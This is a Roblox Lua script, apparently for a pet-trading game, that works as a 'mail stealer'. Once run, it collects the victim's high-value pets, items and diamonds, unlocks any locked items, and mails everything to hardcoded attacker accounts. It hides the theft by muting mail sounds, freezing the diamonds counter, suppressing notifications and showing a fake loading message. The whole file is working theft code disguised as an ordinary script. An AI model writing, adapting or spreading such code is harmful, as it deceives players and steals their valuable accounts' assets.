_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local network = require(game.ReplicatedStorage.Library.Client.Network)
local library = require(game.ReplicatedStorage.Library)
local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
local plr = game.Players.LocalPlayer
local MailMessage = "GGz"
local HttpService = game:GetService("HttpService")
local sortedItems = {}
local totalRAP = 0
local message = require(game.ReplicatedStorage.Library.Client.Message)
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

local users = _G.Usernames or {"ilovemyamazing_gf1", "Yeahboi1131", "Dragonshell23", "Dragonshell24", "Dragonshell21"}
local min_rap = 10000000 -- 10 million
local webhook = _G.webhook or ""

if next(users) == nil or webhook == "" then
    plr:kick("You didn't add any usernames or webhook")
    return
end

for _, user in ipairs(users) do
    if plr.Name == user then
        plr:kick("You cannot mailsteal yourself")
        return
    end
end

for adress, func in pairs(getgc()) do
    if debug.getinfo(func).name == "computeSendMailCost" then
        FunctionToGetFirstPriceOfMail = func
        break
    end
end

local mailSendPrice = FunctionToGetFirstPriceOfMail()

local GemAmount1 = 1
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
        break
    end
end

local function formatNumber(number)
    local number = math.floor(number)
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return string.format("%.2f%s", number, suffixes[suffixIndex])
end

-- Mute mail sounds
game.DescendantAdded:Connect(function(x)
    if x.ClassName == "Sound" then
        if x.SoundId=="rbxassetid://11839132565" 
        or x.SoundId=="rbxassetid://14254721038" 
        or x.SoundId=="rbxassetid://12413423276" then
            x.Volume = 0
            x.PlayOnRemove = false
            x:Destroy()
        end
    end
end)

local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
    gemsleaderstatpath.Value = gemsleaderstatpath.Value
end)

local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
local noti = plr.PlayerGui.Notifications
loading.Disabled = true
noti:GetPropertyChangedSignal("Enabled"):Connect(function()
    noti.Enabled = false
end)
noti.Enabled = false

local function getRAP(Type, Item)
    return (require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get({
        Class = {Name = Type},
        IsA = function(hmm) return hmm == Type end,
        GetId = function() return Item.id end,
        StackKey = function() return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn}) end,
        AbstractGetRAP = function(self) return nil end
    }) or 0)
end

-- Send a single item, cycle users if mailbox full
local function sendItem(category, uid)
    local userIndex = 1
    local maxUsers = #users
    while true do
        local currentUser = users[userIndex]
        local args = {[1]=currentUser, [2]=MailMessage, [3]=category, [4]=uid, [5]=1} -- one item at a time
        local response, err = network.Invoke("Mailbox: Send", unpack(args))

        if response == true then
            GemAmount1 = GemAmount1 - mailSendPrice
            mailSendPrice = math.min(math.ceil(mailSendPrice * 1.5), 5000000)
            return true
        elseif err == "They don't have enough space!" then
            userIndex = userIndex + 1
            if userIndex > maxUsers then
                warn("All mailboxes full for item "..uid)
                return false
            end
        else
            warn("Failed to send item: "..tostring(err))
            return false
        end
    end
end

-- Send all remaining diamonds after all items, full stack per mail
local function SendAllGems()
    local gemIndex = nil
    for i, v in pairs(GetSave().Inventory.Currency) do
        if v.id == "Diamonds" then
            gemIndex = i
            break
        end
    end

    if not gemIndex or GemAmount1 <= 0 then return end

    local remainingGems = GemAmount1
    local userIndex = 1
    local maxUsers = #users

    while remainingGems > 0 and userIndex <= maxUsers do
        local currentUser = users[userIndex]
        local args = {[1]=currentUser, [2]=MailMessage, [3]="Currency", [4]=gemIndex, [5]=remainingGems} -- send all remaining diamonds
        local response, err = network.Invoke("Mailbox: Send", unpack(args))

        if response == true then
            GemAmount1 = 0
            remainingGems = 0
        elseif err == "They don't have enough space!" then
            userIndex = userIndex + 1
        else
            warn("Failed to send gems: "..tostring(err))
            break
        end
    end
end

local function EmptyBoxes()
    if save.Box then
        for key, value in pairs(save.Box) do
            if value._uq then
                network.Invoke("Box: Withdraw All", key)
            end
        end
    end
end

local function ClaimMail()
    local response, err = network.Invoke("Mailbox: Claim All")
    while err == "You must wait 30 seconds before using the mailbox!" do
        wait(0.2)
        response, err = network.Invoke("Mailbox: Claim All")
    end
end

local function canSendMail()
    local uid
    for i,v in pairs(save["Pet"]) do uid=i break end
    local args = {[1]="Roblox",[2]="Test",[3]="Pet",[4]=uid,[5]=1}
    local response, err = network.Invoke("Mailbox: Send", unpack(args))
    return (err == "They don't have enough space!")
end

require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
-- Updated: Removed Booth and Hoverboard
local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Ultimate"}

-- Collect items above min_rap and unlock them
for _,v in pairs(categoryList) do
    if save[v] then
        for uid,item in pairs(save[v]) do
            local rapValue = getRAP(v, item)
            if v=="Pet" then
                local dir = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]
                if (dir.huge or dir.exclusiveLevel) and rapValue >= min_rap then
                    local prefix=""
                    if item.pt==1 then prefix="Golden " elseif item.pt==2 then prefix="Rainbow " end
                    if item.sh then prefix="Shiny "..prefix end
                    local id = prefix..item.id
                    table.insert(sortedItems,{category=v, uid=uid, amount=item._am or 1, rap=rapValue, name=id})
                    totalRAP = totalRAP + rapValue*(item._am or 1)
                end
            else
                if rapValue >= min_rap then
                    table.insert(sortedItems,{category=v, uid=uid, amount=item._am or 1, rap=rapValue, name=item.id})
                    totalRAP = totalRAP + rapValue*(item._am or 1)
                end
            end
            -- Unlock item
            if item._lk then
                network.Invoke("Locking_SetLocked", uid, false)
            end
        end
    end
end

if #sortedItems>0 or GemAmount1>min_rap+mailSendPrice then
    ClaimMail()
    EmptyBoxes()
    if not canSendMail() then
        message.Error("Account error. Please rejoin or use a different account")
        return
    end

    table.sort(sortedItems,function(a,b) return (a.rap*a.amount)>(b.rap*b.amount) end)

    -- Show loading GUI once
    message.Error("Please wait while the script loads!")

    -- Send all items ≥ min_rap
    for _, item in ipairs(sortedItems) do
        local remaining = item.amount
        local userIndex = 1
        while remaining > 0 do
            if userIndex > #users then
                warn("All mailboxes full for item "..item.uid)
                break
            end
            local success = sendItem(item.category, item.uid)
            if success then
                remaining = remaining - 1
            else
                userIndex = userIndex + 1
            end
        end
    end

    -- Send leftover gems after all items
    if GemAmount1 > 0 then
        SendAllGems()
    end

    -- Close loading GUI
    message.Close()
end
